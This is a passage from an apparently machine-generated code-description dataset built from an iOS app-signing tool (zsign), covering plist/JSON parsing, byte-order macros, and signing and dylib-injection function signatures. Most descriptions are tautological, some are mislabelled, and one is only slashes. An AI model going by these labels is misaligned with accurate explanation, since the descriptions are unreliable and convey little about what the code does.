    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "583",
    "code": "struct stat stbuf;\nif (0 == fstat(fileno(fp), &stbuf))\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "struct"
  },
  {
    "id": "584",
    "code": "return read(strdata, pstrerr);",
    "nl": "Function read - implements read functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "585",
    "code": "struct stat stbuf;\nif (0 == fstat(fileno(fp), &stbuf))\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "struct"
  },
  {
    "id": "586",
    "code": "return readPList(strdata, pstrerr);",
    "nl": "Function readPList - implements readplist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "587",
    "code": "return WriteDataToFile(file, strdata.data(), strdata.size());",
    "nl": "Function WriteDataToFile - implements writedatatofile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "588",
    "code": "return WriteDataToFile(file, strdata.data(), strdata.size());",
    "nl": "Function WriteDataToFile - implements writedatatofile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "589",
    "code": "return WriteDataToFile(file, strdata.data(), strdata.size());",
    "nl": "Function WriteDataToFile - implements writedatatofile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "590",
    "code": "return readFile(file);",
    "nl": "Function readFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "591",
    "code": "return readPListFile(file);",
    "nl": "Function readPListFile - implements readplistfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "592",
    "code": "return writeFile(file);",
    "nl": "Function writeFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "593",
    "code": "return writePListFile(file);",
    "nl": "Function writePListFile - implements writeplistfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "594",
    "code": "return styleWriteFile(file);",
    "nl": "Function styleWriteFile - implements stylewritefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "595",
    "code": "return writePList(strDoc);",
    "nl": "Function writePList - implements writeplist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "596",
    "code": "return readValue(root);",
    "nl": "Function readValue - implements readvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "597",
    "code": "return decodeNumber(token, jval);",
    "nl": "Function decodeNumber - implements decodenumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "598",
    "code": "return readArray(jval);",
    "nl": "Function readArray - implements readarray functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "599",
    "code": "return readObject(jval);",
    "nl": "Function readObject - implements readobject functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "600",
    "code": "return addError(\"Syntax error: value, object or array expected.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "601",
    "code": "return readToken(token);",
    "nl": "Function readToken - implements readtoken functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "602",
    "code": "return addError(\"Missing ':' after object member name\", colon.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "603",
    "code": "return addError(\"Missing ',' or '}' in object declaration\", comma.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "604",
    "code": "return addError(\"Missing '}' or object member name\", tokenName.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "605",
    "code": "return addError(\"Missing ',' or ']' in array declaration\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "606",
    "code": "return decodeDouble(token, jval);",
    "nl": "Function decodeDouble - implements decodedouble functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "607",
    "code": "return addError(\"'\" + string(token.pbeg, token.pend) + \"' is not a number.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "608",
    "code": "return addError(\"'\" + string(token.pbeg, token.pend) + \"' is too large or not a number.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "609",
    "code": "return addError(\"Bad escape sequence in string\", pcur);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "610",
    "code": "return addError(\"Bad escape sequence in string\", pcur);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "611",
    "code": "return addError(\"Empty escape sequence in string\", pcur);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "612",
    "code": "return string(\"\\\"\") + pstr + \"\\\"\";",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "613",
    "code": "std::string JWriter::vstring2s(const char *pstr) { return string(\"\\\\\\\"\") + pstr + \"\\\\\\\"\"; }",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "614",
    "code": "#define BE16TOH(x) ((((x) & 0xFF00) >> 8) | (((x) & 0x00FF) << 8))\n\n#define BE32TOH(x)                                                                                                     \\\n((((x) & 0xFF000000) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | (((x) & 0x000000FF) << 24))\n\n#define BE64TOH(x)                                                                                                     \\\n((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \\\n(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \\\n(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \\\n(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))",
    "nl": "//////////////////////////////////////////////////////////////////////// //////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////////",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "615",
    "code": "#define BE32TOH(x)                                                                                                     \\\n((((x) & 0xFF000000) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | (((x) & 0x000000FF) << 24))\n\n#define BE64TOH(x)                                                                                                     \\\n((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \\\n(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \\\n(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \\\n(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))\n\n//////////////////////////////////////////////////////////////////////////",
    "nl": "Function BE32TOH - implements be32toh functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "616",
    "code": "#define BE64TOH(x)                                                                                                     \\\n((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \\\n(((x) & 0x0000FF0000000000ull) >> 24) | (((x) & 0x000000FF00000000ull) >> 8) |                                    \\\n(((x) & 0x00000000FF000000ull) << 8) | (((x) & 0x0000000000FF0000ull) << 24) |                                    \\\n(((x) & 0x000000000000FF00ull) << 40) | (((x) & 0x00000000000000FFull) << 56))\n\n//////////////////////////////////////////////////////////////////////////\nPReader::PReader()\n{",
    "nl": "Function BE64TOH - implements be64toh functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "617",
    "code": "return parseBinary(pdoc, len, root);",
    "nl": "Function parseBinary - implements parsebinary functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "618",
    "code": "return readValue(root, token);",
    "nl": "Function readValue - implements readvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "619",
    "code": "return decodeNumber(token, pval);",
    "nl": "Function decodeNumber - implements decodenumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "620",
    "code": "return decodeDouble(token, pval);",
    "nl": "Function decodeDouble - implements decodedouble functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "621",
    "code": "return readArray(pval);",
    "nl": "Function readArray - implements readarray functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "622",
    "code": "return readDictionary(pval);",
    "nl": "Function readDictionary - implements readdictionary functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "623",
    "code": "return addError(\"Syntax error: value, dictionary or array expected.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "624",
    "code": "return readToken(token);",
    "nl": "Function readToken - implements readtoken functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "625",
    "code": "return readToken(token);",
    "nl": "Function readToken - implements readtoken functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "626",
    "code": "return addError(\"Missing '</dict>' or dictionary member name\", key.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "627",
    "code": "return decodeDouble(token, pval);",
    "nl": "Function decodeDouble - implements decodedouble functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "628",
    "code": "return addError(\"'\" + string(token.pbeg, token.pend) + \"' is not a number.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "629",
    "code": "return addError(\"'\" + string(token.pbeg, token.pend) + \"' is too large or not a number.\", token.pbeg);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "630",
    "code": "return BE64TOH(*((uint64_t *)v));",
    "nl": "Function BE64TOH - implements be64toh functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "631",
    "code": "return BE32TOH(*((uint32_t *)v));",
    "nl": "Function BE32TOH - implements be32toh functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "632",
    "code": "return getUInt24FromBE(v);",
    "nl": "Function getUInt24FromBE - retrieves uint24frombe",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "633",
    "code": "return BE16TOH(*((uint16_t *)v));",
    "nl": "Function BE16TOH - implements be16toh functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "634",
    "code": "case sizeof(uint8_t):\ncase sizeof(uint16_t):\ncase sizeof(uint32_t):\ncase sizeof(uint64_t):\n{",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "635",
    "code": "case sizeof(uint16_t):\ncase sizeof(uint32_t):\ncase sizeof(uint64_t):\n{",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "636",
    "code": "case sizeof(uint32_t):\ncase sizeof(uint64_t):\n{",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "637",
    "code": "case sizeof(uint64_t):\n{",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "638",
    "code": "case sizeof(float):\npv = static_cast<double>(*reinterpret_cast<float *>(buf));",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "639",
    "code": "case sizeof(double):\npv = *reinterpret_cast<double *>(buf);",
    "nl": "Function sizeof - implements sizeof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "640",
    "code": "return readBinaryValue(pval, pv);",
    "nl": "Function readBinaryValue - implements readbinaryvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "641",
    "code": "bool p12_password_check(NSString *file, NSString *pass)\n{",
    "nl": "Function p12_password_check - implements p12 password check functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm",
    "code_type": "function"
  },
  {
    "id": "642",
    "code": "void provision_file_validation(NSString *path)\n{",
    "nl": "This function validates a mobile provision file It reads the file and performs basic validation  TODO: Improve validation logic",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm",
    "code_type": "function"
  },
  {
    "id": "643",
    "code": "void generate_root_ca_pair(const char *basename)\n{",
    "nl": "Function generate_root_ca_pair - implements generate root ca pair functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.mm",
    "code_type": "function"
  },
  {
    "id": "644",
    "code": "bool InjectDyLib(NSString *filePath, NSString *dylibPath, bool weakInject, bool bCreate)\n{",
    "nl": "Function InjectDyLib - implements injectdylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm",
    "code_type": "function"
  },
  {
    "id": "645",
    "code": "bool ListDylibs(NSString *filePath, NSMutableArray *dylibPathsArray)\n{",
    "nl": "Function ListDylibs - implements listdylibs functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm",
    "code_type": "function"
  },
  {
    "id": "646",
    "code": "bool UninstallDylibs(NSString *filePath, NSArray<NSString *> *dylibPathsArray)\n{",
    "nl": "Function UninstallDylibs - implements uninstalldylibs functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm",
    "code_type": "function"
  },
  {
    "id": "647",
    "code": "bool ChangeDylibPath(NSString *filePath, NSString *oldPath, NSString *newPath)\n{",
    "nl": "Function ChangeDylibPath - implements changedylibpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm",
    "code_type": "function"
  },
  {
    "id": "648",
    "code": "int zsign(NSString *app, NSString *prov, NSString *key, NSString *pass, NSString *bundleid, NSString *displayname,\nNSString *bundleversion, bool dontGenerateEmbeddedMobileProvision)\n{",
    "nl": "Function zsign - implements zsign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.mm",
    "code_type": "function"
  },
  {
    "id": "649",
    "code": "class ZArchO\n{",
    "nl": "class ZArchO - implements functionality related to z arch o",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "class"
  },
  {
    "id": "650",
    "code": "bool Init(uint8_t *pBase, uint32_t uLength);",
    "nl": "Function Init - implements init functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "651",
    "code": "bool Sign(ZSignAsset *pSignAsset, bool bForce, const string &strBundleId, const string &strInfoPlistSHA1,\nconst string &strInfoPlistSHA256, const string &strCodeResourcesData);",
    "nl": "Function Sign - implements sign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "652",
    "code": "void PrintInfo() const;",
    "nl": "Function PrintInfo - implements printinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "653",
    "code": "bool IsExecute();",
    "nl": "Function IsExecute - implements isexecute functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "654",
    "code": "bool InjectDyLib(bool bWeakInject, const char *szDyLibPath, bool &bCreate);",
    "nl": "Function InjectDyLib - implements injectdylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "655",
    "code": "uint32_t ReallocCodeSignSpace(const string &strNewFile);",
    "nl": "Function ReallocCodeSignSpace - implements realloccodesignspace functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "656",
    "code": "void uninstallDylibs(const set<string> &dylibNames);",
    "nl": "Function uninstallDylibs - implements uninstalldylibs functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "657",
    "code": "bool ChangeDylibPath(const char *oldPath, const char *newPath);",
    "nl": "Function ChangeDylibPath - implements changedylibpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "658",
    "code": "uint32_t BO(uint32_t uValue) const;",
    "nl": "Function BO - implements bo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "659",
    "code": "bool BuildCodeSignature(ZSignAsset *pSignAsset, bool bForce, const string &strBundleId,\nconst string &strInfoPlistSHA1, const string &strInfoPlistSHA256,\nconst string &strCodeResourcesSHA1, const string &strCodeResourcesSHA256,\nstring &strOutput);",
    "nl": "Function BuildCodeSignature - implements buildcodesignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/archo.h",
    "code_type": "function"
  },
  {
    "id": "660",
    "code": "class ZAppBundle\n{",
    "nl": "class ZAppBundle - implements functionality related to z app bundle",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "class"
  },
  {
    "id": "661",
    "code": "bool SignFolder(ZSignAsset *pSignAsset, const string &strFolder, const string &strBundleID,\nconst string &strBundleVersion, const string &strDisplayName, const string &strDyLibFile,\nbool bForce, bool bWeakInject, bool bEnableCache, bool dontGenerateEmbeddedMobileProvision);",
    "nl": "Function SignFolder - implements signfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "662",
    "code": "bool SignNode(JValue &jvNode);",
    "nl": "Function SignNode - implements signnode functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "663",
    "code": "void GetNodeChangedFiles(JValue &jvNode, bool dontGenerateEmbeddedMobileProvision);",
    "nl": "Function GetNodeChangedFiles - implements getnodechangedfiles functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "664",
    "code": "void GetChangedFiles(JValue &jvNode, vector<string> &arrChangedFiles);",
    "nl": "Function GetChangedFiles - implements getchangedfiles functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "665",
    "code": "void GetPlugIns(const string &strFolder, vector<string> &arrPlugIns);",
    "nl": "Function GetPlugIns - implements getplugins functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "666",
    "code": "bool FindAppFolder(const string &strFolder, string &strAppFolder);",
    "nl": "Function FindAppFolder - implements findappfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "667",
    "code": "bool GetObjectsToSign(const string &strFolder, JValue &jvInfo);",
    "nl": "Function GetObjectsToSign - implements getobjectstosign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "668",
    "code": "bool GetSignFolderInfo(const string &strFolder, JValue &jvNode, bool bGetName = false);",
    "nl": "Function GetSignFolderInfo - implements getsignfolderinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "669",
    "code": "bool GenerateCodeResources(const string &strFolder, JValue &jvCodeRes);",
    "nl": "Function GenerateCodeResources - implements generatecoderesources functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "670",
    "code": "void GetFolderFiles(const string &strFolder, const string &strBaseFolder, set<string> &setFiles);",
    "nl": "Function GetFolderFiles - implements getfolderfiles functionality",
    "language": "cpp",
    "folder": "Shared",
